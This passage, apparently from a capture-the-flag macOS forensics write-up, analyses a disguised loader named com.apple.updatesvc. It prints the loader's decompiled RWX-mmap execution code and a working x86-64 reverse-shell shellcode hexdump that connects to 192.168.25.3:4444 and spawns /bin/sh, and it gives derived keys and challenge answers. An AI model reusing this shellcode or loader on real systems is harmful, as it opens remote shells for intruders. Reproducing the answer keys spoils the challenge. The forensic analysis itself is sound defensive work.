<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mmap</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x2028</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">4098</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
</span></span></code></pre></div><p><strong>mmap Parameters Breakdown:</strong></p>
<ul>
<li><code>addr = 0</code> → Let kernel choose address</li>
<li><code>length = 0x2028</code> (8,232 bytes) → Size of memory region</li>
<li><code>prot = 7</code> → <strong>PROT_READ | PROT_WRITE | PROT_EXEC</strong>
<ul>
<li>Read permission: 0x1</li>
<li>Write permission: 0x2</li>
<li>Execute permission: 0x4</li>
<li>Combined: <strong>0x7 = RWX (Read-Write-Execute)</strong></li>
</ul>
</li>
<li><code>flags = 4098</code> → <strong>MAP_PRIVATE | MAP_ANONYMOUS</strong>
<ul>
<li>MAP_PRIVATE (0x2): Changes not visible to other processes</li>
<li>MAP_ANONYMOUS (0x1000): Not backed by file</li>
<li>Combined: 0x1002 = 4098</li>
</ul>
</li>
<li><code>fd = -1</code> → No file descriptor (anonymous mapping)</li>
<li><code>offset = 0</code> → No offset</li>
</ul>
<p><strong>Purpose:</strong> Allocates executable memory region to bypass DEP (Data Execution Prevention)</p>
<p><strong>4. Error Handling</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v5 <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span>))<span style="color:#f92672">-</span><span style="color:#ae81ff">1LL</span> ) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;mmap&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><ul>
<li>Checks if mmap failed</li>
<li>Exits if unable to allocate executable memory</li>
</ul>
<p><strong>5. Copy Shellcode to Executable Memory</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">__inline_memcpy_chk</span>(v5, __dst, <span style="color:#ae81ff">8201</span>);
</span></span></code></pre></div><ul>
<li>Copies <strong>8,201 bytes</strong> from stack buffer to executable memory region</li>
<li>Uses checked memcpy to prevent buffer overflows</li>
<li>Prepares shellcode for execution</li>
</ul>
<p><strong>6. Execute Shellcode</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">v5</span>();  <span style="color:#75715e">// Call the shellcode as a function
</span></span></span></code></pre></div><ul>
<li><strong>Treats memory region as function pointer</strong></li>
<li>Jumps to shellcode and executes it</li>
<li>This is where the reverse shell connection happens</li>
</ul>
<p><strong>7. Return (Never Reached)</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span></code></pre></div><ul>
<li>Main function returns 0</li>
<li><strong>Note:</strong> Likely never reached if shellcode spawns shell</li>
</ul>
<h5 id="stack-canary-protection">Stack Canary Protection</h5>
<p><strong>Notable Security Feature:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>___stack_chk_fail  <span style="color:#75715e">// Stack canary check function present
</span></span></span></code></pre></div><ul>
<li>Binary compiled with stack protection (<code>-fstack-protector</code>)</li>
<li>Helps prevent buffer overflow exploitation</li>
<li>Ironic: malware using security features</li>
</ul>
<h5 id="imported-functions">Imported Functions</h5>
<p>The payload uses minimal imports:</p>
<table>
  <thead>
      <tr>
          <th>Function</th>
          <th>Purpose</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>memcpy</code></td>
          <td>Copy shellcode to stack buffer</td>
      </tr>
      <tr>
          <td><code>___memcpy_chk</code></td>
          <td>Bounds-checked memory copy</td>
      </tr>
      <tr>
          <td><code>mmap</code></td>
          <td>Allocate executable memory (RWX)</td>
      </tr>
      <tr>
          <td><code>perror</code></td>
          <td>Print error messages</td>
      </tr>
      <tr>
          <td><code>exit</code></td>
          <td>Terminate on error</td>
      </tr>
      <tr>
          <td><code>___stack_chk_fail</code></td>
          <td>Stack canary violation handler</td>
      </tr>
  </tbody>
</table>
<p><strong>Analysis:</strong></p>
<ul>
<li>Minimal footprint reduces detection surface</li>
<li>No network functions imported (uses syscalls directly in shellcode)</li>
<li>Self-contained shellcode execution</li>
</ul>
<h5 id="shellcode-properties">Shellcode Properties:</h5>
<ul>
<li><strong>Size:</strong> 8,201 bytes</li>
<li><strong>Type:</strong> Position-independent x86-64 shellcode</li>
<li><strong>Purpose:</strong> TCP reverse shell to C2 server</li>
<li><strong>Shell:</strong> <code>/bin/sh</code></li>
</ul>
<h5 id="security-implications">Security Implications:</h5>
<ul>
<li><strong>DEP Bypass:</strong> Uses mmap with PROT_EXEC</li>
<li><strong>ASLR Independent:</strong> Position-independent shellcode</li>
<li><strong>Detection Evasion:</strong> No suspicious imports (syscalls in shellcode)</li>
</ul>
<h4 id="shellcode-analysis">Shellcode Analysis:</h4>
<h5 id="method-1-manual-hex-analysis">Method 1: Manual Hex Analysis</h5>
<p>The IP address and port are embedded in the shellcode:</p>
<p><strong>Extraction Method:</strong></p>
<ol>
<li>Open <code>com.apple.updatesvc</code> in hex editor</li>
<li>Search for shellcode section (starting at file offset ~0xF2C)</li>
<li>Look for syscall patterns and sockaddr_in structure</li>
<li>Extract IP (4 bytes) and Port (2 bytes) in network byte order</li>
</ol>
<p><strong>Shellcode hexdump:</strong></p>
<pre tabindex="0"><code>B8 61 00 00 02 6A 02 5F 6A 01 5E 48 31 D2 0F 05
49 89 C4 48 89 C7 B8 62 00 00 02 48 31 F6 56 48
BE 02 00 11 5C C0 A8 19 03 56 48 89 E6 6A 10 5A
0F 05 4C 89 E7 B8 5A 00 00 02 48 C7 C6 02 00 00
00 0F 05 B8 5A 00 00 02 48 C7 C6 01 00 00 00 0F
05 B8 5A 00 00 02 48 C7 C6 00 00 00 00 0F 05 48
31 C0 B8 3B 00 00 02 E8 09 00 00 00 2F 62 69 6E
2F 73 68 00 00 5F 48 31 D2 52 57 48 89 E6 0F 05
</code></pre><p><strong>Size:</strong> 8,201 bytes (0x2009)</p>
<p><strong>Starting Bytes:</strong> <code>B8 61 ...</code></p>
<ul>
<li><code>B8</code> = MOV EAX opcode (x86-64)</li>
<li>Indicates position-independent shellcode</li>
</ul>
<p><strong>Known String:</strong> <code>/bin/sh</code> (found at address 0x100000F94)</p>
<ul>
<li>Confirms this spawns a shell</li>
<li>Used by shellcode to execute <code>/bin/sh</code></li>
</ul>
<p>Based on the size and structure, this shellcode likely performs:</p>
<ol>
<li>
<p><strong>Network Socket Creation</strong></p>
<ul>
<li>Creates TCP socket</li>
<li>Connects to attacker&rsquo;s C2 server</li>
</ul>
</li>
<li>
<p><strong>File Descriptor Duplication</strong></p>
<ul>
<li>Duplicates stdin/stdout/stderr to socket</li>
<li>Redirects shell I/O to network connection</li>
</ul>
</li>
<li>
<p><strong>Shell Execution</strong></p>
<ul>
<li>Executes <code>/bin/sh</code></li>
<li>Provides interactive shell to attacker</li>
</ul>
</li>
</ol>
<h5 id="common-shellcode-pattern">Common Shellcode Pattern:</h5>
<p>This matches the pattern of a <strong>reverse shell</strong> with these syscalls:</p>
<pre tabindex="0"><code>socket()  -&gt; Create network socket
connect() -&gt; Connect to IP:PORT
dup2()    -&gt; Redirect stdin/stdout/stderr to socket
execve()  -&gt; Execute /bin/sh
</code></pre><p><strong>Search Pattern:</strong></p>
<pre tabindex="0"><code>Look for syscall patterns:
- socket(AF_INET, SOCK_STREAM, 0)
- connect(sockfd, &amp;sockaddr, sizeof(sockaddr))

sockaddr_in structure:
  +0: sin_family (2 bytes) = 0x0002 (AF_INET)
  +2: sin_port (2 bytes)   = PORT in network byte order
  +4: sin_addr (4 bytes)   = IP in network byte order
</code></pre><h4 id="extracting-ip-address-and-port-from-shellcode">Extracting IP Address and Port from Shellcode</h4>
<pre tabindex="0"><code>B8 61 00 00 02 6A 02 5F 6A 01 5E 48 31 D2 0F 05
49 89 C4 48 89 C7 B8 62 00 00 02 48 31 F6 56 48
BE 02 00 11 5C C0 A8 19 03 56 48 89 E6 6A 10 5A
0F 05 4C 89 E7 B8 5A 00 00 02 48 C7 C6 02 00 00
00 0F 05 B8 5A 00 00 02 48 C7 C6 01 00 00 00 0F
05 B8 5A 00 00 02 48 C7 C6 00 00 00 00 0F 05 48
31 C0 B8 3B 00 00 02 E8 09 00 00 00 2F 62 69 6E
2F 73 68 00 00 5F 48 31 D2 52 57 48 89 E6 0F 05
</code></pre><h5 id="step-by-step-extraction">Step-by-Step Extraction:</h5>
<h6 id="step-1-identify-the-connect-syscall">Step 1: Identify the <code>connect()</code> Syscall</h6>
<p>Look for the <strong>connect syscall number</strong> in the shellcode:</p>
<pre tabindex="0"><code>Line 2: B8 62 00 00 02
        ^^^^^^^^^^^^^^
        MOV EAX, 0x2000062  (connect syscall)
</code></pre><p><strong>Key Indicator:</strong> <code>B8 62 00 00 02</code> = syscall number for <code>connect()</code> on macOS</p>
<h6 id="step-2-find-the-movabs-instruction">Step 2: Find the <code>movabs</code> Instruction</h6>
<p>After the connect syscall number, look for the <strong><code>movabs</code> instruction</strong> that loads the sockaddr_in structure:</p>
<pre tabindex="0"><code>Line 2-3: 48 BE 02 00 11 5C C0 A8 19 03
          ^^^^^  ^^^^^^^^^^^^^^^^^^^^^^
          movabs    8-byte immediate value
</code></pre><p><strong>Breakdown:</strong></p>
<ul>
<li><code>48 BE</code> = <code>MOVABS RSI, imm64</code> (load 64-bit immediate into RSI)</li>
<li>Following 8 bytes = the sockaddr_in structure</li>
</ul>
<h6 id="step-3-extract-the-8-bytes">Step 3: Extract the 8 Bytes</h6>
<pre tabindex="0"><code>02 00 11 5C C0 A8 19 03
</code></pre><p>These 8 bytes contain the complete socket address structure!</p>
<h5 id="understanding-sockaddr_in-structure">Understanding sockaddr_in Structure</h5>
<p>The <code>sockaddr_in</code> structure in C looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sockaddr_in {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> sin_family;  <span style="color:#75715e">// Address family (AF_INET = 2)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint16_t</span> sin_port;    <span style="color:#75715e">// Port number (network byte order)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint32_t</span> sin_addr;    <span style="color:#75715e">// IP address (network byte order)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span></code></pre></div><p><strong>Memory Layout (8 bytes total):</strong></p>
<pre tabindex="0"><code>+0x00: [2 bytes] sin_family (little-endian on x86-64)
+0x02: [2 bytes] sin_port   (big-endian / network byte order)
+0x04: [4 bytes] sin_addr   (big-endian / network byte order)
</code></pre><h5 id="decoding-the-bytes">Decoding the Bytes</h5>
<p>Let&rsquo;s decode <code>02 00 11 5C C0 A8 19 03</code> field by field:</p>
<h5 id="field-1-sin_family-bytes-0-1">Field 1: sin_family (bytes 0-1)</h5>
<pre tabindex="0"><code>02 00
</code></pre><p><strong>Interpretation:</strong></p>
<ul>
<li>Read as <strong>little-endian</strong> (x86-64 architecture)</li>
<li>Value = <code>0x0002</code> = <strong>2 decimal</strong></li>
<li>Meaning: <strong>AF_INET</strong> (IPv4 address family)</li>
</ul>
<p>IPv4 socket</p>
<h5 id="field-2-sin_port-bytes-2-3">Field 2: sin_port (bytes 2-3)</h5>
<pre tabindex="0"><code>11 5C
</code></pre><p><strong>Interpretation:</strong></p>
<ul>
<li>Read as <strong>big-endian</strong> (network byte order - standard for TCP/IP)</li>
<li>Value = <code>0x115C</code> in hex</li>
<li>Convert to decimal:</li>
</ul>
<pre tabindex="0"><code>0x115C = (1 × 16³) + (1 × 16²) + (5 × 16¹) + (12 × 16⁰)
       = (1 × 4096) + (1 × 256) + (5 × 16) + (12 × 1)
       = 4096 + 256 + 80 + 12
       = 4444 decimal
</code></pre><p>Port <strong>4444</strong></p>
<p><strong>Quick conversion using Ipython:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">2</span>]: int(<span style="color:#e6db74">&#39;0x115C&#39;</span>, <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><h5 id="field-3-sin_addr-bytes-4-7">Field 3: sin_addr (bytes 4-7)</h5>
<pre tabindex="0"><code>C0 A8 19 03
</code></pre><p><strong>Interpretation:</strong></p>
<ul>
<li>Read as <strong>big-endian</strong> (network byte order)</li>
<li>Each byte represents one octet of the IP address</li>
<li>Convert each hex byte to decimal:</li>
</ul>
<table>
  <thead>
      <tr>
          <th>Hex Byte</th>
          <th>Decimal</th>
          <th>Position</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>C0</code></td>
          <td>192</td>
          <td>First octet</td>
      </tr>
      <tr>
          <td><code>A8</code></td>
          <td>168</td>
          <td>Second octet</td>
      </tr>
      <tr>
          <td><code>19</code></td>
          <td>25</td>
          <td>Third octet</td>
      </tr>
      <tr>
          <td><code>03</code></td>
          <td>3</td>
          <td>Fourth octet</td>
      </tr>
  </tbody>
</table>
<p><strong>Conversion:</strong></p>
<pre tabindex="0"><code>C0 (hex) = 12×16 + 0 = 192 (decimal)
A8 (hex) = 10×16 + 8 = 168 (decimal)
19 (hex) = 1×16 + 9 = 25 (decimal)
03 (hex) = 0×16 + 3 = 3 (decimal)
</code></pre><p>IP Address <strong>192.168.25.3</strong></p>
<h5 id="visual-breakdown">Visual Breakdown</h5>
<pre tabindex="0"><code>Original bytes: 02 00 11 5C C0 A8 19 03
                │  │  │  │  │  │  │  │
                │  │  │  │  └──┴──┴──┴─── IP Address
                │  │  └──┴─────────────── Port Number
                └──┴────────────────────── Address Family

Field Breakdown:
┌────────────┬──────────┬──────────────────────┐
│ sin_family │ sin_port │ sin_addr             │
├────────────┼──────────┼──────────────────────┤
│ 02 00      │ 11 5C    │ C0 A8 19 03          │
│ (LE)       │ (BE)     │ (BE)                 │
├────────────┼──────────┼──────────────────────┤
│ 0x0002     │ 0x115C   │ 0xC0A81903           │
│ = 2        │ = 4444   │ = 192.168.25.3       │
│ = AF_INET  │          │                      │
└────────────┴──────────┴──────────────────────┘

LE = Little Endian (Intel x86-64 byte order)
BE = Big Endian (Network byte order)
</code></pre><h5 id="complete-assembly-context">Complete Assembly Context</h5>
<p>Here&rsquo;s the relevant assembly with annotations:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Line 2: Setup connect syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">B8</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">02</span>          <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0x2000062</span>      <span style="color:#75715e">; connect() syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">31</span> <span style="color:#a6e22e">F6</span>                <span style="color:#66d9ef">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>            <span style="color:#75715e">; Clear RSI
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">56</span>                      <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>                <span style="color:#75715e">; Push NULL (padding)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; Line 3: Load sockaddr_in structure
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#a6e22e">BE</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">5</span><span style="color:#66d9ef">C</span>       <span style="color:#66d9ef">movabs</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x0319A8C0</span>  <span style="color:#75715e">; Load address structure
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">C0</span> <span style="color:#66d9ef">A8</span> <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">03</span>                   <span style="color:#ae81ff">5</span><span style="color:#66d9ef">C110002</span>    <span style="color:#75715e">; (split across lines)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      
</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">┌─</span> <span style="color:#a6e22e">Breakdown</span> <span style="color:#66d9ef">of</span> <span style="color:#ae81ff">0x0319A8C05C110002</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#a6e22e">Little-endian</span> <span style="color:#66d9ef">read</span> (<span style="color:#66d9ef">bottom</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">top</span>):
</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#960050;background-color:#1e0010">02</span> <span style="color:#960050;background-color:#1e0010">00</span> <span style="color:#960050;background-color:#1e0010">11</span> <span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">C</span> <span style="color:#66d9ef">C0</span> <span style="color:#66d9ef">A8</span> <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">03</span>
</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">│</span>  
</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">│</span>  <span style="color:#a6e22e">AF_INET</span><span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">2</span>, <span style="color:#66d9ef">Port</span><span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">4444</span>, <span style="color:#66d9ef">IP</span><span style="color:#960050;background-color:#1e0010">=</span><span style="color:#ae81ff">192</span><span style="color:#66d9ef">.168.25.3</span>
</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">└────────────────────────────────────────</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">56</span>                      <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>                <span style="color:#75715e">; Push to stack
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">48</span> <span style="color:#960050;background-color:#1e0010">89</span> <span style="color:#a6e22e">E6</span>                <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>            <span style="color:#75715e">; RSI = pointer to sockaddr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">6</span><span style="color:#a6e22e">A</span> <span style="color:#ae81ff">10</span>                   <span style="color:#66d9ef">push</span> <span style="color:#ae81ff">0x10</span>               <span style="color:#75715e">; sizeof(sockaddr_in) = 16
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">5</span><span style="color:#a6e22e">A</span>                      <span style="color:#66d9ef">pop</span> <span style="color:#66d9ef">rdx</span>                 <span style="color:#75715e">; RDX = 16 (addrlen)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; Line 4: Execute connect
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">F</span> <span style="color:#ae81ff">05</span>                   <span style="color:#66d9ef">syscall</span>                 <span style="color:#75715e">; connect(sockfd, &amp;sockaddr, 16)
</span></span></span></code></pre></div><p>Here&rsquo;s a Python script to automatically extract IP and port:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_ip_port_from_shellcode</span>(shellcode_hex):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Extract IP address and port from x86-64 connect() shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Remove spaces and convert to bytes</span>
</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(shellcode_hex<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Look for movabs instruction (48 BE) followed by 8 bytes</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(shellcode) <span style="color:#f92672">-</span> <span style="color:#ae81ff">9</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> shellcode[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x48\xbe</span><span style="color:#e6db74">&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Extract the 8-byte sockaddr_in structure</span>
</span></span><span style="display:flex;"><span>            sockaddr_bytes <span style="color:#f92672">=</span> shellcode[i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>]
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Parse sin_family (little-endian, 2 bytes)</span>
</span></span><span style="display:flex;"><span>            sin_family <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(sockaddr_bytes[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#39;little&#39;</span>)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Parse sin_port (big-endian / network byte order, 2 bytes)</span>
</span></span><span style="display:flex;"><span>            sin_port <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(sockaddr_bytes[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>], <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Parse sin_addr (4 bytes, each byte is an octet)</span>
</span></span><span style="display:flex;"><span>            ip_octets <span style="color:#f92672">=</span> sockaddr_bytes[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span>            ip_address <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>join(str(octet) <span style="color:#66d9ef">for</span> octet <span style="color:#f92672">in</span> ip_octets)
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> sin_family <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:  <span style="color:#75715e"># AF_INET</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> ip_address, sin_port
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Your shellcode</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">B8 61 00 00 02 6A 02 5F 6A 01 5E 48 31 D2 0F 05
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">49 89 C4 48 89 C7 B8 62 00 00 02 48 31 F6 56 48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">BE 02 00 11 5C C0 A8 19 03 56 48 89 E6 6A 10 5A
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0F 05 4C 89 E7 B8 5A 00 00 02 48 C7 C6 02 00 00
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00 0F 05 B8 5A 00 00 02 48 C7 C6 01 00 00 00 0F
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">05 B8 5A 00 00 02 48 C7 C6 00 00 00 00 0F 05 48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">31 C0 B8 3B 00 00 02 E8 09 00 00 00 2F 62 69 6E
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2F 73 68 00 00 5F 48 31 D2 52 57 48 89 E6 0F 05
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> extract_ip_port_from_shellcode(shellcode)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;IP Address: </span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Port: </span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;C2 Server: </span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p><strong>Output:</strong></p>
<pre tabindex="0"><code>IP Address: 192.168.25.3
Port: 4444
C2 Server: 192.168.25.3:4444
</code></pre><p>Therefore, the IP address and port number to which the attacker established a connection from the compromised system is : <code>192.168.25.3:4444</code></p>
<p>Q12/15) What are the key and initialization vector (IV) used by the malicious application to decrypt its payload, and what compression method was used for the payload ? Format: <em>key_iv_compression</em></p>
<p>From the analysis of the <code>preview</code> binary in Q11 we can see that key and and initialization vector (IV)  used by the malicious application to decrypt its payload is derived from the <code>Hardware-UUID</code> of the device, which is unique for each and every device when looking up online we found that we can find this <code>Hardware-UUID</code> from a particular artifact:
<img src="images/Hardware-UUID(keychain).png" alt="hardware-uuid">
Source: <a href="https://discussions.apple.com/thread/7759719?sortBy=rank" target="_blank">https://discussions.apple.com/thread/7759719?sortBy=rank</a>
From the output of the <code>mac_list_files</code> usin volatility 2 , we can get the path of the Keychain files under <code>~/Library/Keychains</code> we can get the <code>Hardware-UUID</code> of this device:</p>
<pre tabindex="0"><code>0xffffff80247d4000 /Users/admin/Library/Keychains/564D245B-513D-024D-D236-4BF7887A32FC/keychain-2.db-wal
</code></pre><p>Hence from observing the above path we can conclude that the <code>Hardware-UUID</code> is <code>564D245B-513D-024D-D236-4BF7887A32FC</code>
Now from the previous analysis of the <code>preview</code> binary we know that :</p>
<ul>
<li><strong>Key:</strong> SHA-256 hash of <code>Hardware-UUID</code></li>
<li><strong>IV:</strong> MD5 hash of <code>Hardware-UUID</code>
So the key and iv are <code>7b8049c197d6f91bab9d983dca12f743cfdc3bdc4ff0f89349f1fdab6e46ce8c</code> and <code>0878db6e1ec69f91623fa63250e8fc3b</code> respectively , we can also get the compression method used from our previous analysis, that is gzip
Therefore, the answer for this question is :</li>
</ul>
<pre tabindex="0"><code>7b8049c197d6f91bab9d983dca12f743cfdc3bdc4ff0f89349f1fdab6e46ce8c_0878db6e1ec69f91623fa63250e8fc3b_gzip
</code></pre><p>Q13/15) At what path does the malicious application write the decrypted payload to, and what is the SHA-256 hash of the decrypted payload? Format: <em>/binary/path_hash</em>
